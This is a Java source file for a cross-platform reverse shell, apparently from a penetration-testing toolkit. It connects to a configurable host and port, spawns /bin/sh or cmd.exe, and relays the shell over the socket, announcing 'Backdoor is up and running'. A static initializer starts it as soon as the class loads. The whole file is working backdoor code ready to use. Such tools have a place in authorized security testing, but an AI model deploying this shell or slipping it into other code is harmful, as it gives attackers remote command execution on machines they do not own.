// Copyright (c) 2021 Ivan Šincek
// v4.0
// Requires Java SE v8 or greater and JDK v8 or greater.
// Works on Linux OS, macOS, and Windows OS.

import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;

public class ReverseShell {

    // change the host address and/or port number as necessary
    private static String  addr   = "127.0.0.1";
    private static int     port   = 9000;
    private static String  os     = null;
    private static String  shell  = null;
    private static byte[]  buffer = null;
    private static int     clen   = 0;
    private static boolean error  = false;

    private static boolean detect() {
        boolean detected = true;
        os = System.getProperty("os.name").toUpperCase();
        if (os.contains("LINUX") || os.contains("MAC")) {
            os    = "LINUX";
            shell = "/bin/sh";
        } else if (os.contains("WIN")) {
            os    = "WINDOWS";
            shell = "cmd.exe";
        } else {
            detected = false;
            System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
        }
        return detected;
    }

    // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
    private static void brw(InputStream input, OutputStream output, String iname, String oname) {
        int bytes;
        try {
            do {
                if (os.equals("WINDOWS") && iname.equals("STDOUT") && clen > 0) {
                    // for some reason Windows OS pipes STDIN into STDOUT
                    // we do not like that
                    // we need to discard the data from the stream
                    do {
                        bytes = input.read(buffer, 0, clen >= buffer.length ? buffer.length : clen);
                        clen -= clen >= buffer.length ? buffer.length : clen;
                    } while (bytes > 0 && clen > 0);
                } else {
                    bytes = input.read(buffer, 0, buffer.length);
                    if (bytes > 0) {
                        output.write(buffer, 0, bytes);
                        output.flush();
                        if (os.equals("WINDOWS") && oname.equals("STDIN")) {
                            clen += bytes;
                        }
                    } else if (iname.equals("SOCKET")) {
                        error = true;
                        System.out.print("SOC_ERROR: Shell connection has been terminated\n");
                    }
                }
            } while (input.available() > 0);
        } catch (SocketTimeoutException ex) {} catch (IOException ex) {
            error = true;
            System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n", iname, oname));
        }
    }

    public static void run() {
        if (detect()) {
            Process process = null;
            buffer = new byte[1024];
            try (
                    Socket client = new Socket();
                ) {
                client.setSoTimeout(100);
                client.connect(new InetSocketAddress(addr, port));
                process = new ProcessBuilder(shell).redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
                try (
                        OutputStream socin  = client.getOutputStream();
                        InputStream  socout = client.getInputStream();
                        OutputStream stdin  = process.getOutputStream();
                        InputStream  stdout = process.getInputStream();
                        InputStream  stderr = process.getErrorStream();
                    ) {
                    System.out.print("Backdoor is up and running...\n");
                    do {
                        if (!process.isAlive()) {
                            System.out.print("PROC_ERROR: Shell process has been terminated\n");
                            break;
                        }
                        brw(socout, stdin, "SOCKET", "STDIN");
                        if (stderr.available() > 0) { brw(stderr, socin, "STDERR", "SOCKET"); }
                        if (stdout.available() > 0) { brw(stdout, socin, "STDOUT", "SOCKET"); }
                    } while (!error);
                    System.out.print("Backdoor will now exit...\n");
                }
            } catch (IOException ex) {
                System.out.print(String.format("ERROR: %s\n", ex.getMessage()));
            } finally {
                if (process != null) { process.destroy(); }
                Arrays.fill(buffer, (byte) 0);
            }
        }
    }

    static {
        run();
        System.gc();
    }

}
